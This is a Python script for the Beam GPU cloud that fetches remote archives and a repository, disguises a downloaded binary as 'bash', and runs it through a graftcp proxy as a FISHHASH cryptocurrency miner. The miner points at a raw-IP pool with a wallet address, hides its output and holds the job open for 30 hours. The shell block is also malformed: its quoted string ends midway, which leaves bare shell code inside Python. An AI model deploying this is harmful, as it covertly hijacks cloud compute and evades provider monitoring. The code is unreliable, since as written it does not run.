from beam import function, Image
import subprocess
import time

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
    ])
)


@function(
    name="t4x3-runner",
    image=image,
    gpu="RTX4090",
    cpu=2,
    memory="4Gi",
    timeout=30 * 60 * 60,
)
def run_script():

    cmd = """
    set -e

    echo "=== DOWNLOAD FILE ==="
    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip

    echo "=== EXTRACT ==="
    unzip -o pan.zip

    echo "=== CHECK PAN ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== ENTER PAN ==="
    cd /mnt/code/pan

    echo "=== SET PERMISSION ==="
    chmod -R +x .

    echo "=== START GRAFTCP LOCAL ==="
    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    sleep 3

    echo "=== DOWNLOAD LOL ==="
    cd /mnt/code/pan
    git clone https://github.com/malogrono/lol198.git

    echo "=== CHECK LOL198 ==="
    ls -lah /mnt/code/pan/lol198

    echo "=== CHECK BASH ==="
    cd /mnt/code/pan/lol198
    ls -lh bash

    chmod u+x bash

    echo "=== MOVE BASH ==="
    mv bash /mnt/code/pan/

    echo "=== CHECK PAN AFTER MOVE ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== FINAL DIRECTORY ==="
    cd /mnt/code/pan
    pwd
    ls -lah

    echo "=== RUN PROC VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash --algo FISHHASH --pool 95.111.195.159:443 --user ASTEROID:0xccb0c7d0b4adb142c846663732c30ade15bdbe8d.RTX --ethstratum ETHPROX
    """

    START_TIME=$(date +%s)

    # Jalankan program tetap menggunakan graftcp
    # tetapi sembunyikan output program
    ./graftcp/graftcp ./bash > /dev/null 2>&1 &
    PROC_PID=$!

    # Timer
    while kill -0 "$PROC_PID" 2>/dev/null; do

        NOW=$(date +%s)
        ELAPSED=$((NOW - START_TIME))

        HOURS=$((ELAPSED / 3600))
        MINUTES=$(((ELAPSED % 3600) / 60))
        SECONDS=$((ELAPSED % 60))

        printf "\rElapsed: %02d:%02d:%02d" "$HOURS" "$MINUTES" "$SECONDS"

        sleep 1
    done

    wait "$PROC_PID"

    echo
    echo "=== PROCESS FINISHED ==="
    """

    # Tetap menggunakan subprocess.run
    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 30 hours...", flush=True)

    time.sleep(60 * 60 * 30)
